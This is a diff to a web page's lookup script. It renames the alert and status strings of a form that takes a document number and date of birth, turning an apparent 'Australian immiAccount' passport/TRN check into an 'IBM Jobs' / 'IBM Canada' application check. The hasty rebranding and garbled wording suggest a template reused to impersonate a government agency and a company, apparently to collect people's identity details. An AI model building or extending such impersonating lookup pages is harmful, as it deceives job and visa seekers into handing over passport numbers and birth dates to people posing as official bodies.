@@ -172,7 +172,7 @@ Here you'll, find the jobs, that best match, your skills and interest. Use the f
         const dobInput = document.getElementById('dob').value;
 
         if (!docNum || !dobInput) {
-            alert("Please provide your passport/document (TRN) number and date of birth correctly. Otherwise please check your Australian immiAccount Application, details and Try again!");
+            alert("Please provide your Jobs Id/document number, and date of birth correctly. Otherwise please check your IBM Jobs From Application, details and Try again!");
             return;
         }
 
@@ -218,12 +218,12 @@ Here you'll, find the jobs, that best match, your skills and interest. Use the f
 
                 document.getElementById('resultArea').style.display = 'block';
                 const today = new Date().toISOString().slice(0, 10);
-                document.getElementById('lastChecked').innerText = "Last checked: " + today;
+                document.getElementById('lastChecked').innerText = "Status Last Check: " + today;
 
                 startAutoHomeTimer();
 
             } else {
-                alert("Your information is incorrect! au Govt, information not found? Provide Passport / Document (TRN) Number!");
+                alert("Your information is incorrect! IBM Canada, information not found? Provide jobs I'd/ Document Number!");
                 document.getElementById('searchForm').style.display = 'block';
             }
         }).catch(err => {
